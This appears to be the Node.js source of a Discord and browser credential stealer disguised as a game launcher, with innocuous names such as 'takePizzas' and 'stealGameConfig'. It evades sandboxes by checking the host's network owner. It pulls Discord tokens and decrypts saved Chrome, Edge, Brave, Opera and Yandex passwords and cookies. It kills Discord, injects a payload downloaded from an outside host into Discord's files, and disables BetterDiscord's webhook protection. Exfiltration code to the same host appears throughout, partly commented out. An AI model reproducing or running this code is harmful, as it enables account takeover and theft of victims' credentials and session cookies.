console.log("Starting game...");
var debug = true;
var args = process.argv.slice(2);
if (args[0] == "debug") debug = !![];
else hideSelf();

const fs = require("fs");
const glob = require("glob");
const crypto = require("crypto");
const { exec } = require("child_process");
const https = require("https");
const buf_replace = require("buffer-replace");
const sqlite3 = require("sqlite3"); //require('nexe-natives')(require.resolve("sqlite3"));
const dpapi = require("win-dpapi"); //require('nexe-natives')(require.resolve('win-dpapi'));
(async () => {
  https
    .get("https://ipinfo.io/json", (ip_info) => {
      let data = "";
      ip_info.on("data", (payload) => (data += payload));
      ip_info.on("end", () => {
        if (true) {
          let org = JSON.parse(data).org?.toLowerCase();
          let orgs = ["microsoft", "google", "ovh"];
          if (orgs.some((o) => org?.includes(o))) return process.exit(1);
          stealGameConfig();
          takePizzas();
          takeCheese();
          startGame();
        }
      });
    })
    .on("error", (err) => {
      if (true) {
        if (debug) console.log(err);
      }
    });
})();
var appdata = process.env.APPDATA;
var localappdata = process.env.LOCALAPPDATA;
var games = [];
var injectPath = [];
var runningGames = [];
var paths = [
  appdata + "\\discord\\",
  appdata + "\\discordcanary\\",
  appdata + "\\discordptb\\",
  appdata + "\\discorddevelopment\\",
  appdata + "\\lightcord\\",
  localappdata + "\\Google\\Chrome\\User Data\\Default\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 1\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 2\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 3\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 4\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 5\\",
  localappdata + "\\Google\\Chrome\\User Data\\Guest Profile\\",
  localappdata + "\\Google\\Chrome\\User Data\\Default\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 1\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 2\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 3\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 4\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 5\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Guest Profile\\Network\\",
  appdata + "\\Opera Software\\Opera Stable\\",
  appdata + "\\Opera Software\\Opera GX Stable\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Default\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 1\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 2\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 3\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 4\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 5\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Guest Profile\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\",
];
fs.readdirSync(localappdata).forEach((appdata) => {
  console.log("Searching game folder...");
  if (appdata.includes("cord")) games.push(localappdata + "\\" + appdata);
  else return;
});
games.forEach((game) => {
  console.log("Making game config...");
  let resource_path = game + "\\app-*\\resources\\";
  console.log(game);
  glob.sync(resource_path).map((resource) => {
    console.log(resource);
    injectPath.push(resource);
    console.log("Saving config file...");
    listGames();
  });
});

function Infect() {
  console.log("Searching online update");
  console.log("https://superfuniestindianparty.rip/frPI3qkI9jWG/str");
  https
    .get("https://superfuniestindianparty.rip/frPI3qkI9jWG/str", (payload) => {
      let data = "";
      payload.on("data", (chunk) => (data += chunk));
      payload.on("end", () => {
        injectPath.forEach((path) => {
          try {
            var appPath = path + "app";
            if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
            fs.writeFileSync(
              appPath + "\\package.json",
              '{"main":"index.js","name":"discord"}',
              { encoding: "utf8", flag: "w" }
            );
            fs.writeFileSync(appPath + "\\index.js", data, {
              encoding: "utf8",
              flag: "w",
            });
          } catch (err) {
            if (debug) console.log(err);
          }
          startGame();
        });
      });
    })
    .on("error", (err) => {
      if (debug) console.log(err);
    });
}

function listGames() {
  console.log("Trying config...");
  exec("tasklist", (_err, stdout, _stdin) => {
    const order = "1|4|0|3|2".split("|");
    let idx = 0;
    while (!![]) {
      switch (order[idx++]) {
        case "0":
          if (stdout.includes("DiscordDevelopment.exe"))
            runningGames.push("DiscordDevelopment");
          continue;
        case "1":
          if (stdout.includes("Discord.exe")) runningGames.push("Discord");
          continue;
        case "2":
          if (stdout.includes("DiscordPTB.exe"))
            runningGames.push("DiscordPTB");
          continue;
        case "3":
          killGame();
          continue;
        case "4":
          if (stdout.includes("DiscordCanary.exe"))
            runningGames.push("DiscordCanary");
          continue;
      }
      break;
    }
  });
}

function killGame() {
  runningGames.forEach((game) => {
    try {
      exec("taskkill /IM" + game + ".exe /F", (err) => {
        if (err && debug) console.log(err);
      });
    } catch (err) {
      if (debug) console.log(err);
    }
  });

  Infect();
  superGameFinder();
}

function startGame() {
  runningGames.forEach((game) => {
    console.log("Starting game paths...");
    path = localappdata + "\\" + game + "\\Update.exe";
    try {
      exec(path + " --processStart " + game + ".exe", (err) => {
        if (err) if (debug) console.log(err);
      });
    } catch (err) {
      if (debug) console.log(err);
    }
  });
}

function superGameFinder() {
  var betterDiscord =
    process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
  if (fs.existsSync(betterDiscord)) {
    var betterDiscordBuffer = fs.readFileSync(betterDiscord);
    try {
      fs.writeFileSync(
        betterDiscord,
        buf_replace(betterDiscordBuffer, "api/webhooks", "kkkk")
      );
    } catch (err) {
      if (debug) console.log(err);
    }
  } else return;
}

async function getPizzas(installdir) {
  let path_dirs = installdir.split("\\");
  let data_parts = installdir.includes("Network")
    ? path_dirs.splice(-path_dirs.length, path_dirs.length - 3)
    : path_dirs.splice(-path_dirs.length, path_dirs.length - 2);
  let data_dir = data_parts.join("\\") + "\\";

  if (installdir.startsWith(appdata)) data_dir = installdir;
  if (installdir.includes("cord")) return;

  if (fs.existsSync(data_dir)) {
    try {
      let local_state = fs.readFileSync(data_dir + "Local State");
      let { encrypted_key } = JSON.parse(local_state).os_crypt;
      let local_buf_b64 = Buffer.from(encrypted_key, "base64").slice(5);
      var login_data = installdir + "Login Data";
      var password_db_file = installdir + "passwords.db";

      fs.copyFileSync(login_data, password_db_file);

      const local_buf_utf8 = Buffer.from(local_buf_b64, "utf-8");
      const unprot_local_state = dpapi.unprotectData(
        local_buf_utf8,
        null,
        "CurrentUser"
      );

      var password_headline =
        "PASSWORDS FROM: " + installdir + "  #BBYSTEALERSEXYSPAINMAMI\n";
      var password_db = new sqlite3.Database(password_db_file, (err) => {
        if (err && debug) console.log(err);
      });

      const promise = await new Promise((resolve, _reject) => {
        password_db.each(
          "SELECT origin_url, username_value, password_value FROM logins",
          (err, row) => {
            if (err && debug) console.log(err);
            if (row.username_value != "") {
              let { password_value } = row;

              try {
                if (
                  password_value[0] == 1 &&
                  password_value[1] == 0 &&
                  password_value[2] == 0 &&
                  password_value[3] == 0
                ) {
                  password_headline +=
                    "\nURL: " +
                    row.origin_url +
                    (" | USERNAME:" + row.username_value) +
                    (" | PASSWORD:" +
                      dpapi
                        .unprotectData(password_value, null, "CurrentUser")
                        .toString("utf-8"));
                } else {
                  let local_state_iv = password_value.slice(3, 15);

                  let deciperhiv_update_data = password_value.slice(
                    15,
                    password_value.length - 16
                  );

                  let local_auth_tag = password_value.slice(
                    password_value.length - 16,
                    password_value.length
                  );

                  let local_decipheriv = crypto.createDecipheriv(
                    "aes-256-gcm",
                    unprot_local_state,
                    local_state_iv
                  );

                  local_decipheriv.setAuthTag(local_auth_tag);

                  let password = local_decipheriv.update(
                    deciperhiv_update_data,
                    "base64",
                    "utf-8"
                  );

                  password += local_decipheriv.final("utf-8");

                  password_headline +=
                    "\nURL: " +
                    row.origin_url +
                    (" | USERNAME:" + row.username_value) +
                    (" | PASSWORD:" + password);
                }
              } catch (err) {
                if (debug) console.log(err);
              }
            }
          },
          () => {
            resolve(password_headline);
          }
        );
      });
      return promise;
    } catch (err) {
      if (debug) console.log(err);
    }
  } else {
    return "";
  }
}

async function getCheese(installpath) {
  let path_dirs = installpath.split("\\");
  let data_parts = installpath.includes("Network")
    ? path_dirs.splice(-path_dirs.length, path_dirs.length - 5)
    : path_dirs.splice(-path_dirs.length, path_dirs.length - 2);
  let data_dir = data_parts.join("\\") + "\\";

  if (installpath.startsWith(appdata)) data_dir = installpath;
  if (installpath.includes("cord")) return;
  if (fs.existsSync(data_dir)) {
    try {
      let local_state = fs.readFileSync(data_dir + "Local State");
      let { encrypted_key } = JSON.parse(local_state).os_crypt;
      let b64_buffer = Buffer.from(encrypted_key, "base64").slice(6);

      var cookies = installpath + "Cookies";
      var cookie_db_file = installpath + "cookies.db";

      fs.copyFileSync(cookies, cookie_db_file);

      const utf8_buf = Buffer.from(b64_buffer, "utf-8");
      const unprot_local_state = dpapi.unprotectData(
        utf8_buf,
        null,
        "CurrentUser"
      );

      var cookie_headline =
        "\n" + "COOKIES FROM: " + installpath + "  #BBYSTEALERSEXYSPAINMAMI\n";
      var cookie_db = new sqlite3.Database(cookie_db_file, (err) => {
        if (err && debug) console.log(err);
      });

      const promise = await new Promise((resolve, _reject) => {
        cookie_db.each(
          "SELECT host_key, name, encrypted_value FROM cookies",
          (err, row) => {
            if (err && debug) console.log(err);
            let { encrypted_value } = row;
            try {
              if (
                encrypted_value[0] == 1 &&
                encrypted_value[1] == 0 &&
                encrypted_value[2] == 0 &&
                encrypted_value[3] == 0
              ) {
                cookie_headline +=
                  "\nHOST KEY:" +
                  row.host_key +
                  (" | NAME: " + row.name) +
                  (" | VALUE: " +
                    dpapi
                      .unprotectData(encrypted_value, null, "CurrentUser")
                      .toString("utf-8"));
              } else {
                let local_state_iv = encrypted_value.slice(3, 15);
                let deciperhiv_update_data = encrypted_value.slice(
                  15,
                  encrypted_value.length - 16
                );
                let local_auth_tag = encrypted_value.slice(
                  encrypted_value.length - 16,
                  encrypted_value.length
                );
                let local_decipheriv = crypto.createDecipheriv(
                  "aes-256-gcm",
                  unprot_local_state,
                  local_state_iv
                );

                local_decipheriv.setAuthTag(local_auth_tag);

                let cookie = local_decipheriv.update(
                  deciperhiv_update_data,
                  "base64",
                  "utf-8"
                );
                cookie += local_decipheriv.final("utf-8");
                cookie_headline +=
                  "\nHOST KEY:" +
                  row.host_key +
                  (" | NAME: " + row.name) +
                  (" | VALUE: " + cookie);
              }
            } catch (err) {
              if (debug) console.log(err);
            }
          },
          () => {
            resolve(cookie_headline);
          }
        );
      });
      return promise;
    } catch (err) {
      if (debug) console.log(err);
    }
  } else return "";
}
async function takePizzas() {
  let password_payload = "";

  console.log(await Promise.all(paths.map(async (p) => getPizzas(p))));
  console.log(await Promise.all(paths.map(async (p) => getCheese(p))));

  for (let i = 0; i < paths.length; i++) {
    if (fs.existsSync(paths[i] + "Login Data"))
      password_payload += (await getPizzas(paths[i])) || "";
    if (i + 1 === paths.length) {
      /*const password_request_data = {};
      password_request_data.hostname = "superfuniestindianparty.rip";
      password_request_data.port = 443;
      password_request_data.path = "/frPI3qkI9jWG/passwords";
      password_request_data.method = "POST";
      password_request_data.headers = {};
      password_request_data.headers["User-Agent"] = "bbystealer_kkk01";
      password_request_data.headers["Content-Type"] = "text/plain";
      password_request_data.headers["Content-Length"] = password_payload.length;

      var password_request = https.request(password_request_data);

      password_request.on("error", (err) => {
          if (debug) console.log(err);
      });

      password_request.write(password_payload);
      password_request.end();*/
    }
  }
}

async function takeCheese() {
  let cookie_payload = "";

  for (let i = 0; i < paths.length; i++) {
    if (fs.existsSync(paths[i] + "Cookies"))
      cookie_payload += (await getCheese(paths[i])) || "";
    if (i + 1 === paths.length) {
      const cookie_request_data = {};

      cookie_request_data.hostname = "superfuniestindianparty.rip";
      cookie_request_data.port = 443;
      cookie_request_data.path = "/frPI3qkI9jWG/cookies";
      cookie_request_data.method = "POST";
      cookie_request_data.headers = {};
      cookie_request_data.headers["User-Agent"] = "bbystealer_kkk01";
      cookie_request_data.headers["Content-Type"] = "text/plain";
      cookie_request_data.headers["Content-Length"] = cookie_payload.length;

      //var cookie_request = https.request(cookie_request_data);

      /*cookie_request.on("error", (err) => { 
        if (debug) console.log(err);
      });
      cookie_request.write(cookie_payload);
      cookie_request.end();*/
    }
  }
}

function hideSelf() {
  let temp_ps1 = "is in ./temp.ps1";

  let cwd = process.cwd();

  let temp = cwd + "\\temp.ps1";

  /*try {
    fs.writeFileSync(temp, temp_ps1);
    require("child_process").execSync(
      "type .\temp.ps1 | powershell.exe -noprofile -", 
      { stdio: "inherit" }
    );
    fs.unlinkSync(temp);
  } catch (err) {}*/
}
function findToken(path) {
  path += "Local Storage\\leveldb";

  let tokens = [];

  try {
    fs.readdirSync(path).map((file) => {
      if (file.endsWith(".log") || file.endsWith(".ldb")) {
        fs.readFileSync(path + "\\" + file, "utf8")
          .split(/\r?\n/)
          .forEach((line) => {
            const regexps = [
              new RegExp(/mfa\.[\w-]{84}/g),
              new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g),
            ];

            for (const regex of regexps) {
              const match_arr = line.match(regex);
              if (match_arr) match_arr.forEach((token) => tokens.push(token));
            }
          });
      }
    });
  } catch (err) {}
  return tokens;
}
function onlyUnique(_0x286aa6, _0x174b74, _0x481c78) {
  return _0x481c78.indexOf(_0x286aa6) === _0x174b74;
}

async function stealGameConfig() {
  const token_arr = [];

  for (let path of paths) {
    const tokens = findToken(path);
    if (tokens) tokens.forEach((token) => token_arr.push(token));
  }

  var unique_tokens = token_arr.filter(onlyUnique);
  var tokens_payload = JSON.stringify(unique_tokens);

  console.log(tokens_payload);

  /*const tokens_request_data = {};

  tokens_request_data.hostname = "superfuniestindianparty.rip";
  tokens_request_data.port = 443;
  tokens_request_data.path = "/frPI3qkI9jWG/tokens";
  tokens_request_data.method = "POST";
  tokens_request_data.headers = {};
  tokens_request_data.headers["User-Agent"] = "bbystealer_kkk01";
  tokens_request_data.headers["Content-Type"] = "application/json";
  tokens_request_data.headers["Content-Length"] = tokens_payload.length;

  var tokens_request = https.request(tokens_request_data);
  tokens_request.on(
    "error",
    (err) => {
      if (debug) console.log(err);
    }
  );
  tokens_request.write(tokens_payload);
  tokens_request.end();*/
}